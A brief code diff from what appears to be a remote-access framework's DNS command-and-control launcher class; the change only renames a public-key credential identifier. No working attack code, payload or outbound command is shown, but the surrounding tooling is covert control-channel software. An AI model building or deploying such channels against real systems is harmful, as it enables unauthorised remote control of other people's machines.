@@ -191,7 +191,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 class DNSCncLauncher(BaseLauncher):
     ''' Micro command protocol built over DNS infrastructure '''
 
-    credentials = [ 'DNSCNC_PUB_KEY' ]
+    credentials = [ 'DNSCNC_PUB_KEY_V2' ]
 
     def __init__(self, *args, **kwargs):
         self.connect_on_bind_payload=kwargs.pop('connect_on_bind_payload', False)
